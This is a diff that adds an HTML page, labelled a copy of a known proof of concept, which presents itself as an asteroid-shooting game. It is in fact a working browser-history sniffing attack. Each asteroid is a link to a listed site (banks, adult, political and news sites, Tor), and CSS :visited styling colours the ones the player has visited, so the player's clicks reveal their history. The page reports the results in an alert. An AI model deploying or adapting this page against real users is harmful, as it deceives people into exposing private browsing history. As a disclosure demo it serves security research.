@@ -1,0 +1,377 @@
+<!-- Yeah, it won't work in incognito mode. -->
+<style>
+body {
+  text-align: center;
+  overflow: hidden;
+}
+a {
+  border: 8px solid black;
+  display: block;
+  position: absolute;
+  height: 0px;
+  width: 0px;
+  border-radius: 8px;
+  z-index: -2;
+}
+a:visited {
+  border-color: pink;
+}
+.sandbox_ctr {
+  display: inline-block;
+  border: 20px solid steelblue;
+  padding: 0;
+  margin: 0;
+  cursor: crosshair;
+}
+.sandbox {
+  background-color: black;
+  width: 800px;
+  height: 600px;
+  padding: 0;
+  margin: 0;
+  position: relative;
+  z-index: -1;
+}
+.ship {
+  position: absolute;
+  background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA+CAYAAAB3NHh5AAADeElEQVRoge2ZPZKCQBCFOQGhZW6MZWQsBzDYiGDjTS1jPcJmHsDcTMy9ANdQCw5gFeFsso9q2p7hb5CFpas6EHCmP95MT8/gOKONNtpoFWy63irqXcfTqk3XWzXbhTkfLDQA58dHznG96/is2nS9zeDmx4c6P0/q/Dzlrg1K6el6q87Pk5rtQhUsJjmf7UKVpPFwgAE7Pz5UsJio+36pkjRWt8tB3fdLFSwmmeqDgObqSsCzXTgcYMAAlgMDGi+l63gbGeYnHc464PnxoZI07je0NH9NwL0f1hRYytA0Uw8CGPOXFhpYg+laTO/1dkgDFvOySGGqci+hpeFsmsO9H9b/EhhLEge+XQ4qSWMRuLdlpklhE3AvFcbuiG7/XM/XJi3X83OJq1e7J64sYAHjen62JLmenz3HoXuhNJ+3OpAkjVWSxtoX0wtowFII1/OzsysMVUlhDOHpepsbDWjvz0HrYAFcVmEAU2i8nD8DLcFy4KoK66ZB59A62GC1ybJy1TmM/wSrzcv/OlXaBAtgrLFUSZ3CgL3vlxmwBN2J0kWw319hBpyk8UthISkcLCZZMeJ6vvr+CrXQb1W6DKwEXKSwBCxB011Y69BlYSnw7XIorTA2FBS4M6VxPoWOTLAScBmFdcASNNpoRWl6GEc36TpY2wpL0PS0xPqhAa2P0YE0Z2mgTbO0rl30y+OxpjKtj3kHNCPTwHENsKi2TAqj6MB/dO0Gq43iAljdR0uN0y8FFFpShsKaFOalpaSwDtaayjwr08xMy0Fd0qKlZRmFJWA6lGmZyj+9Wklg0nDmH7PhJmCuMPUihTks/6hubVhL6vKdDXVpHeabB1oy0hK0SGHeF9+BWVHZNJx5cHApayM4fp+qR6GlrMz70UHXBkZiMAG7ni82CjAeXBEwf4m4ruuD5wYKXDmBScBlYGlAkpuAJS/qQ3e48HZgBATAbH9sAObPlmm/deCysMQUdZ2Sv21SL2W6oqYrYA5R1d8H7DjyVrACsPr8/MgcEPgdRVcVRVftfXKtFrCVZakuMAv8BVi63wmw47werFcBNgEVAUfRtTawtdKyapZ2fqFZ4EXztTastR2TpHJD6MbPSoWH1ZOPptDOq5J1nnEc5w2wMLoPpQfnVjspGQctNlo9vaSfTLr87PHWODCcWu2kR3GMNtpoo402WgP7ASqAggEYsAOIAAAAAElFTkSuQmCC');
+  top: 269px;
+  left: 370px;
+  display: inline-block;
+  width: 60px;
+  height: 62px;
+  z-index: -2;
+}
+.explosion {
+  border: 2px solid red;
+  display: block;
+  position: absolute;
+  height: 10px;
+  width: 10px;
+  margin: -7px;
+  border-radius: 10px;
+  z-index: -2;
+  background-color: yellow;
+}
+.explosion2 {
+  border: 7px solid #404040;
+  display: block;
+  position: absolute;
+  height: 5px;
+  width: 5px;
+  margin: -10px;
+  border-radius: 20px;
+  z-index: -2;
+  background-color: orange;
+}
+</style>
+
+<body>
+
+<h4>exact copy of the original PoC @ http://lcamtuf.coredump.cx/yahh/ but with an updated list of URLs</h4>
+
+<script>
+
+var RESX = 800;
+var RESY = 600;
+var STARTX = 0;
+var STARTY = 0;
+
+var sandbox;
+var ship;
+var score = 0;
+var game_over = false;
+
+function R(x) { return Math.floor(Math.random() * x); }
+
+function start_stuff() {
+  var tmp;
+  document.getElementById('start').disabled = true;
+  sandbox = document.getElementById('sandbox');
+  tmp = sandbox;
+  while (tmp) {
+    STARTX += tmp.offsetLeft;
+    STARTY += tmp.offsetTop;
+    tmp = tmp.offsetParent;
+  }
+  ship = document.createElement('div');
+  ship.className = 'ship';
+  sandbox.appendChild(ship);
+
+  setInterval(generate_asteroid, 700);
+}
+
+var urls_to_try = [
+  'https://www.amazon.com/',
+  'https://www.playboy.com/',
+  'https://reddit.com/r/conspiracy',
+  'https://twitter.com/',
+  'https://theintercept.com/',
+  'https://www.rt.com/',
+  'https://edition.cnn.com/',
+  'https://www.presstv.com/',
+  'https://www.mercurynews.com/',
+  'https://en.wikipedia.org/wiki/Opossum',
+  'http://www.foxnews.com/',
+  'https://www.bing.com/',
+  'https://www.bankofamerica.com/',
+  'https://www.bestbuy.com/',
+  'https://thepiratebay.org/',
+  'https://www.ghacks.net/',
+  'http://slashdot.org/',
+  'https://www.petfinder.com/',
+  'https://www.torproject.org/',
+  'https://www.walmart.com/',
+  'https://www.ebay.com/',
+  'https://news.ycombinator.com/',
+  'https://www.wellsfargo.com/',
+  'bork://not_visited/'
+];
+
+var cur_url = 0;
+var visited = '';
+var not_visited = '';
+var done_here = false;
+
+function turn_ship(event) {
+
+  if (!sandbox || game_over) return;
+
+  var ship_x = STARTX + RESX / 2;
+  var ship_y = STARTY + RESY / 2;
+
+  var off_x = event.clientX - ship_x;
+  var off_y = event.clientY - ship_y;
+
+  var deg = 0;
+
+    deg = Math.atan2(off_y, off_x) * 180 / Math.PI + 90;
+
+  ship.style.webkitTransform = 'rotate(' + deg + 'deg)';
+  ship.style.transform = 'rotate(' + deg + 'deg)';
+
+}
+
+function explode(event) {
+
+  if (!sandbox || game_over) return;
+
+  var off_x = event.clientX - STARTX;
+  var off_y = event.clientY - STARTY;
+
+  var explosion = document.createElement('div');
+  explosion.className = 'explosion';
+  explosion.style.left = off_x;
+  explosion.style.top = off_y;
+
+  sandbox.appendChild(explosion);
+
+  setTimeout(function() { explosion.className = 'explosion2'; }, 100);
+  setTimeout(function() { sandbox.removeChild(explosion); }, 200);
+
+  for (var i = 0; i < ast_cnt; i++) {
+    if (asteroids[i] == null) continue;
+
+    var a_x = asteroids[i].curx - off_x;
+    var a_y = asteroids[i].cury - off_y;
+
+    if (Math.sqrt(a_x*a_x + a_y*a_y) < 25) {
+      sandbox.removeChild(asteroids[i]);
+
+      if (!asteroids[i].real)
+        visited += asteroids[i].href + '\n';
+
+      asteroids[i].deleted = true;
+      asteroids[i] = null;
+      score += 100;
+      document.getElementById('score').textContent = score;
+    }
+  }
+}
+
+var ast_cnt = 0;
+
+var asteroids = [];
+
+function generate_asteroid() {
+  var use_real = false;
+
+  if (game_over) return;
+
+  var x = document.createElement('a');
+
+  if ((ast_cnt % 15) == 0) use_real = true;
+
+  switch (R(5)) {
+    case 0:
+      x.sx = -10;
+      x.sy = -10;
+      if (use_real) x.dx = 1.22; else {
+        if (R(2)) x.dx = 1.1; else x.dx = 1.55;
+      }
+      x.dy = 1;
+      break;
+    case 1:
+      x.sx = -10;
+      x.sy = 50;
+      if (use_real) x.dx = 1.8; else {
+        if (R(2)) x.dx = 1.35; else x.dx = 2.05;
+      }
+      x.dy = 1;
+      break;
+    case 2:
+      x.sx = -10;
+      x.sy = 150;
+      if (use_real) x.dx = 1.3; else {
+        if (R(2)) x.dx = 1.85; else x.dx = 1.05;
+      }
+      x.dy = 0.5;
+      break;
+    case 3:
+      x.sx = 50;
+      x.sy = -10;
+      if (use_real) x.dx = 1.2; else x.dx = 1.35;
+      x.dy = 1;
+      break;
+    case 4:
+      x.sx = 200;
+      x.sy = -10;
+      if (use_real) x.dy = 1.4; else x.dy = 1.25;
+      x.dx = 1;
+      break;
+  }
+
+  if (R(2)) {
+    x.sx = RESX - x.sx;
+    x.dx = -x.dx;
+  }
+
+  if (R(2)) {
+    x.sy = RESY - x.sy;
+    x.dy = -x.dy;
+  }
+
+  x.clk = 0;
+
+  x.style.top = (x.sx-8) + 'px';
+  x.style.left = (x.sy-8) + 'px';
+
+  x.curx = x.sx;
+  x.cury = x.sy;
+
+  if (urls_to_try.length == cur_url) {
+    use_real = true;
+    if (R(3) != 0 && !done_here) return;
+  }
+
+  if (use_real) {
+    x.href = location.href;
+    x.real = true;
+  } else {
+    x.href = urls_to_try[cur_url++];
+    if (cur_url == urls_to_try.length) x.last_test = true;
+  }
+
+  sandbox.appendChild(x);
+
+  x.ast_no = ast_cnt;
+
+  asteroids[ast_cnt] = x;
+
+  ast_cnt++;
+
+  setTimeout(function() { move_asteroid(x); }, 20);
+
+}
+
+function move_asteroid(x) {
+
+  if (x.deleted || game_over) return;
+
+  var nx = x.sx + (x.dx * x.clk);
+  var ny = x.sy + (x.dy * x.clk);
+
+  x.style.left =  (nx-8) + 'px';
+  x.style.top  = (ny-8) + 'px';
+
+  x.curx = nx;
+  x.cury = ny;
+
+  x.clk++;
+
+  if (x.real) {
+    var xnx = nx - RESX / 2;
+    var xny = ny - RESY / 2;
+
+    if (Math.sqrt(xnx*xnx + xny*xny) < 20) {
+      game_over = true;
+
+      document.getElementById('start').disabled = false;
+      document.getElementById('start').value = 'Try again!';
+      document.getElementById('start').onclick = function() { location.reload(); }
+
+      alert('Game over! Try again.');
+
+      return;
+
+    }
+
+  }
+
+  if (nx < -12 || nx > RESX + 12 ||
+      ny < -12 || ny > RESY + 12) {
+
+    if (!x.real) {
+
+      if (x.last_test) {
+
+        alert('Aaand we\'re done.\n\n' +
+              'Sites you have visited:\n\n' +
+              visited + '\n' +
+              'Not visited:\n\n' + not_visited);
+
+        done_here = true;
+        setInterval(generate_asteroid, 200);
+
+      }
+
+      not_visited += x.href + '\n';
+
+    }
+
+    sandbox.removeChild(x);
+    asteroids[x.ast_cnt] = null;
+
+  } else {
+
+    setTimeout(function() { move_asteroid(x); }, 20);
+
+  }
+
+}
+
+var cache_img = new Image();
+cache_img.src = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA+CAYAAAB3NHh5AAADeElEQVRoge2ZPZKCQBCFOQGhZW6MZWQsBzDYiGDjTS1jPcJmHsDcTMy9ANdQCw5gFeFsso9q2p7hb5CFpas6EHCmP95MT8/gOKONNtpoFWy63irqXcfTqk3XWzXbhTkfLDQA58dHznG96/is2nS9zeDmx4c6P0/q/Dzlrg1K6el6q87Pk5rtQhUsJjmf7UKVpPFwgAE7Pz5UsJio+36pkjRWt8tB3fdLFSwmmeqDgObqSsCzXTgcYMAAlgMDGi+l63gbGeYnHc464PnxoZI07je0NH9NwL0f1hRYytA0Uw8CGPOXFhpYg+laTO/1dkgDFvOySGGqci+hpeFsmsO9H9b/EhhLEge+XQ4qSWMRuLdlpklhE3AvFcbuiG7/XM/XJi3X83OJq1e7J64sYAHjen62JLmenz3HoXuhNJ+3OpAkjVWSxtoX0wtowFII1/OzsysMVUlhDOHpepsbDWjvz0HrYAFcVmEAU2i8nD8DLcFy4KoK66ZB59A62GC1ybJy1TmM/wSrzcv/OlXaBAtgrLFUSZ3CgL3vlxmwBN2J0kWw319hBpyk8UthISkcLCZZMeJ6vvr+CrXQb1W6DKwEXKSwBCxB011Y69BlYSnw7XIorTA2FBS4M6VxPoWOTLAScBmFdcASNNpoRWl6GEc36TpY2wpL0PS0xPqhAa2P0YE0Z2mgTbO0rl30y+OxpjKtj3kHNCPTwHENsKi2TAqj6MB/dO0Gq43iAljdR0uN0y8FFFpShsKaFOalpaSwDtaayjwr08xMy0Fd0qKlZRmFJWA6lGmZyj+9Wklg0nDmH7PhJmCuMPUihTks/6hubVhL6vKdDXVpHeabB1oy0hK0SGHeF9+BWVHZNJx5cHApayM4fp+qR6GlrMz70UHXBkZiMAG7ni82CjAeXBEwf4m4ruuD5wYKXDmBScBlYGlAkpuAJS/qQ3e48HZgBATAbH9sAObPlmm/deCysMQUdZ2Sv21SL2W6oqYrYA5R1d8H7DjyVrACsPr8/MgcEPgdRVcVRVftfXKtFrCVZakuMAv8BVi63wmw47werFcBNgEVAUfRtTawtdKyapZ2fqFZ4EXztTastR2TpHJD6MbPSoWH1ZOPptDOq5J1nnEc5w2wMLoPpQfnVjspGQctNlo9vaSfTLr87PHWODCcWu2kR3GMNtpoo402WgP7ASqAggEYsAOIAAAAAElFTkSuQmCC';
+
+if (navigator.userAgent.indexOf('Chrome/') == -1 &&
+    navigator.userAgent.indexOf('Firefox/') == -1)
+  alert('Sorry, this game works only in Firefox and Chrome.');
+
+function check_dim() {
+  if (window.innerWidth < 880 || window.innerHeight < 740)
+    alert('Your browser window is too small. Try at least 900 x 750 or so.');
+}
+
+setTimeout(check_dim, 100);
+
+</script>
+
+<h3 style='margin-bottom: 1ex'><b>Defend Your Spaceship! Score: <span id=score>0</span></b></h3>
+
+<div class=sandbox_ctr onmousemove="turn_ship(event)" onclick="explode(event)">
+<div id="sandbox" class="sandbox">
+</div>
+</div>
+
+<p>
+<input type=button onclick="start_stuff()" value="Start game!" id="start" style='font-weight: bold'>
